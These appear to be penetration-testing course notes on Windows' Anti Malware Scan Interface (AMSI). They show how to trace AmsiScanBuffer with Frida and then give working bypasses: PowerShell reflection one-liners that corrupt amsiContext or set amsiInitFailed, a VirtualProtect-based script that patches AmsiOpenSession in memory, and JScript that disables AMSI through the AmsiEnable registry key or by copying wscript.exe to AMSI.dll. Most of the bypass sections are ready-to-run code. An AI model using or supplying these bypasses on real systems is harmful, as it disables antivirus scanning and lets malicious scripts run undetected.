# AMSI

Anti Malware Scan Interface

AMSI is loaded into every PowerShell process and interacts with AV (by default Windows Defender). Exposed API:

* AmsiInitialize
* AmsiOpenSession
* AmsiScanString
* AmsiScanBuffer
* AmsiCloseSession

AmsiScanBuffer is used to check a buffer for malicious code. In case of ret = 32768, it is indeed malicious, ret = 1 means its clean.

### Tracing AMSI with Frida

Install Frida: Install python3 and then `pip install frida-tools` .

Trace AMSI (open PowerShell, then run the following):

```
frida-trace -p <powershell pid> -x amsi.dll -i Amsi*
```

When running a PowerShell command, we can see AmsiScanBuffer being called. On startup, Frida creates handlers - we can edit these to modify the trace behavior. We can for example log the argument buffer:

On windows, it will be located here:

```
C:\Users\Offsec\__handlers__\amsi.dll\AmsiScanBuffer.js
```

Then change:

```js
onEnter: function (log, args, state) {
  log('[*] AmsiScanBuffer()');
  log('|- amsiContext: ' + args[0]);
  log('|- buffer: ' + Memory.readUtf16String(args[1]));
  log('|- length: ' + args[2]);
  log('|- contentName ' + args[3]);
  log('|- amsiSession ' + args[4]);
  log('|- result ' + args[5] + "\n");
  this.resultPointer = args[5];
},

onLeave: function (log, retval, state) {
  log('[*] AmsiScanBuffer() Exit');
  resultPointer = this.resultPointer;
  log('|- Result value is: ' + Memory.readUShort(resultPointer) + "\n");
}
```

```bash
log(' amsiContext: ' + args[0]);
log(' buffer: ' + Memory.readUtf16String(args[1]));
```

### Bypass: Zero out AmsiContext

AmsiContext has a PTR to a buffer that starts with the string "AMSI", if we patch this string out, AMSI is disabled.

We can do this by using Reflection to get the pointer to AmsiContext and then write zero to the buffer:

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

'amsiutils'
```

Alternatively we can also set the "AmsiInitialize"-Field to null using the same technique (to evade AV use the same technique as above to improve it):

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFai
led','NonPublic,Static').SetValue($null,$true)
```

### Bypass: Patch AMSI AmsiOpenSession Instruction

We can disable AMSI by overwriting only three bytes of memory inside the _AmsiOpenSession_ API. Modify the first instruction of _AmsiOpenSession_ directly from PowerShell with the help of Win32 APIs.

```powershell
function LookupFunc {
  Param ($moduleName, $functionName)
  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $tmp=@()
  $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
  Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void]
  )
  $type = [AppDomain]::CurrentDomain.
  DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
  DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
  return $type.CreateType()
}

# make memory writeable
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

# Overwrite AMSI Bytes (TEST RDX, RDX -> XOR RAX RAX)
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

# set old memory permissions again
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

### Bypass: AMSI in JScript

In order to use a DotNetToJscript payload, we'll need to bypass AMSI. However, when bypassing AMSI in PowerShell, we relied on reflection or Win32 APIs, but these techniques are not available from Jscript.

Security researcher Tal Liberman discovered that Jscript tries to query the "AmsiEnable" registry key from the HKCU hive before initializing AMSI. If this key is set to "0", AMSI is not enabled for the Jscript process.

This query is performed in the _`JAmsi::JAmsiIsEnabledByRegistry`_ function inside Jscript.dll, which is only called when wscript.exe is started.

The Jscript implementation of AMSI reveals that _`AmsiScanString`_and _`AmsiScanBuffer`_get called but _`AmsiOpenSession`_does not. Jscript handles each command in a single session while PowerShell processes each in a separate session. We can not access Win32 APIs from JScript so we need another way using the Registry:

```js
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try {
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable!=0){
    throw new Error(1, '');
}
} catch(e) {
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName,0,1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}
```

Alternatively we can copy/rename wscript.exe to AMSI.dll, causing AMSI loading to fail.

We know that AMSI requires AMSI.DLL. If we could prevent AMSI.DLL from loading or load our own version of it, we could force the AMSI implementation in wscript.exe to produce an error and abort.

While it seems logical to attempt to simply overwrite AMSI.DLL, we must have administrative permissions to overwrite anything in `C:\Windows\System32`. We could, however, perform a DLL hijacking attack by exploiting the DLL search order.

```js
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try {
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0){
        throw new Error(1, '');
    }
} catch(e) {
    filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName);
    WScript.Quit(1);
}
```
